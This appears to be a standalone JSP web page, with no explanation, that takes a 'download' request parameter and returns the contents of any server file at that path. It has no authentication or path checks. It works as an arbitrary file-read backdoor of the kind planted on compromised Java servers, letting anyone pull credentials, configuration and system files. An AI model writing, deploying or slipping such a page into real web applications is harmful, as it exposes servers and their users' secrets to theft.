<%@page import="java.io.PrintWriter"%>
<%@page import="java.io.File"%>
<%@page import="java.io.FileReader"%>
<%@page import="java.io.BufferedReader"%>
<%
  String path = request.getParameter("download");
  if ( path != null) {
    try {
      response.setContentType("application/binary");
      response.setHeader("Content-disposition", "attachment; filename=\"" + path + "\"");
      PrintWriter sos = new PrintWriter(response.getWriter());
      BufferedReader in = new BufferedReader ( new FileReader( new File(path) )); 
      String aux = in.readLine();
      if(aux!=null) sos.println(aux);
	  while ((aux = in.readLine())!=null) sos.println(aux);     
	  in.close();
	  sos.close();
    } catch (Exception ee) { ee.printStackTrace(); }
  }
%>